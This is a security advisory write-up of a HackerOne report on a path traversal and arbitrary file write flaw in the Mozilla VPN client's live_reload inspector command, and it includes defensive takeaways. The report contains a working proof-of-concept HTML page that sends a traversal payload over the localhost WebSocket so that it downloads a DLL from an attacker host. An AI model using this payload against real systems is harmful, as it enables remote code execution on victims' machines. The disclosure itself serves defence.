# Mozilla VPN Clients: RCE via file write and path traversal in live_reload command

## Metadata
- **Source:** HackerOne
- **Report:** 2995025 | https://hackerone.com/reports/2995025
- **Submitted:** 2025-02-15
- **Reporter:** trein
- **Program:** Mozilla VPN
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Path Traversal, Arbitrary File Write, Remote Code Execution, Improper Input Validation
- **CVEs:** None
- **Category:** memory-binary

## Summary
The Mozilla VPN Client contains a path traversal vulnerability in the live_reload inspector command that allows arbitrary file writes to the filesystem. An attacker can download remote files and write them to any location by using path traversal sequences (..\), enabling RCE through file overwrites when developer mode is enabled.

## Attack scenario
1. Attacker enables developer mode on Mozilla VPN client by clicking Help menu 6 times and selecting staging servers option
2. Attacker crafts malicious HTML page containing WebSocket connection to localhost:8765 (inspector endpoint)
3. Attacker crafts live_reload command with path traversal payload: 'live_reload http://attacker.com/..\..\traversal_poc.dll'
4. Victim visits attacker's HTML page while VPN client with developer mode is running
5. Inspector processes the command and downloads file from attacker server without validating path
6. File is written to unintended location (e.g., C:\Users\user\AppData\Local\Mozilla) via path traversal, overwriting critical files or placing executable payloads

## Root cause
The InspectorHotreloader::fetchAndAnnounce() function constructs file paths using simple string concatenation without sanitizing the filename parameter. The code uses QString("%1/%2").arg(m_qml_folder, path.fileName()) which only extracts the filename but does not validate against path traversal sequences. On Windows, backslash traversal sequences (..\) can bypass the intended directory constraint.

## Attacker mindset
An attacker with knowledge of Mozilla VPN's inspector WebSocket interface and developer mode activation process can exploit this with minimal user interaction. By hosting a simple HTML page and socially engineering a user to visit it while dev mode is active, the attacker can achieve arbitrary file write and RCE. The use of staging servers reduces friction for testing/exploitation.

## Defensive takeaways
- Implement strict path validation: reject any filename containing '..' or path traversal sequences before file operations
- Use secure file path construction APIs instead of string concatenation; leverage libraries that sanitize path components
- Implement a whitelist of allowed characters in filenames (alphanumeric, dots, underscores only)
- Disable inspector/developer features in production builds and require explicit restart with environment flags
- Validate downloaded file contents match expected format before writing to disk
- Implement rate limiting and origin validation on WebSocket inspector endpoints
- Consider sandboxing file write operations to a restricted directory that cannot be escaped
- Log all file write operations initiated via inspector commands for security monitoring

## Variant hunting
Check all file write operations in inspector module for similar path concatenation patterns
Review other inspector commands that handle file paths (load_qml, load_resource, etc.)
Audit any user-controlled input passed to QFile operations without sanitization
Test forward slash traversal sequences (../../) in addition to backslash on all platforms
Verify if similar vulnerabilities exist in other Mozilla applications using inspector infrastructure
Check for race conditions between file write and file read operations in hot reload mechanism

## MITRE ATT&CK
- T1190
- T1218
- T1567
- T1200

## Notes
Vulnerability requires developer mode to be explicitly enabled, reducing exposure but still critical since users can be socially engineered. Does not affect macOS per researcher. Related to previous vuln #2920675. Attack leverages WebSocket interface on localhost:8765 which is accessible from any webpage in browser context. Path traversal works differently on Windows (backslash) vs Unix systems.

## Full report
<details><summary>Expand</summary>

## Summary:
Hi! I decided to have another look at the Mozilla VPN Client, after #2920675 was set to resolved. When going over all commands in the inspector, I noticed the "live_reload" command can be used with remote files. When using this command, the remote file is downloaded to a tmp folder. The problem is that there is a path traversal here, meaning we can override any file on the filesystem (tested on Windows).

Vulnerable code (InspectorHotreloader::fetchAndAnnounce() https://github.com/mozilla-mobile/mozilla-vpn-client/blob/main/src/inspector/inspectorhotreloader.cpp):
```
QObject::connect(
      request, &NetworkRequest::requestCompleted,
      [this, path, dummy_task](const QByteArray& data) {
        dummy_task->deleteLater();
        auto temp_path = QString("%1/%2").arg(m_qml_folder, path.fileName());
        auto temp_file = new QFile(temp_path);
        temp_file->open(QIODevice::WriteOnly);
        if (!temp_file->write(data)) {
          logger.warning() << "Unable to write to file:"
                           << temp_file->fileName();
          return;
        }
        if (!temp_file->flush()) {
          logger.warning() << "Unable to flush to file:"
                           << temp_file->fileName();
          return;
        }
        temp_file->close();
        QFileInfo info(temp_path);
        annonceReplacedFile(QUrl::fromLocalFile(info.absoluteFilePath()));
      });
```
You can see in the above snippet, that the temp_path  is simply a concatenation of a set directory and our filename.

## Steps To Reproduce:
  
1. Download Mozilla VPN here: https://www.mozilla.org/en-US/products/vpn/download/
  1. Turn on developer mode (see video PoC below):
      1. Open the help menu
      1. Click  the "Help" title 6 times rapidly
      1. In the developer options, check "Use Staging Servers"
      1. Fully close and reopen
  1. Save the following HTML and open it (change to your attacker_server)
``` html
<script>
    var ws = new WebSocket('ws://localhost:8765/');
    var attacker_server = "███████" // needs to be HTTP, no HTTPS
    
    payload = `live_reload ${attacker_server}/..\\..\\traversal_poc.dll`

    ws.onopen = function() {
        ws.send(payload); 
    };
    ws.onmessage = function(event) {
        document.getElementById("data").innerText += event.data + "\n";
    };
 </script>
 <h1>Data retrieved:</h1>
 <div id="data"></div>
```
1. Notice the file was written to C:\Users\user\AppData\Local\Mozilla instead of C:\Users\user\AppData\Local\Mozilla\Mozilla VPN\hot_reload.

## Supporting Material/References:
█████

Happy to help if anything is unclear!

## Impact

Any file can be overridden leading to RCE. This is exploitable via limited user interaction (simply opening the attacker site) when the staging servers are being used. ==Note that this does not work on macOS.== The impact is the same as in #2920675.

</details>

---
*Analysed by Claude on 2026-05-24*
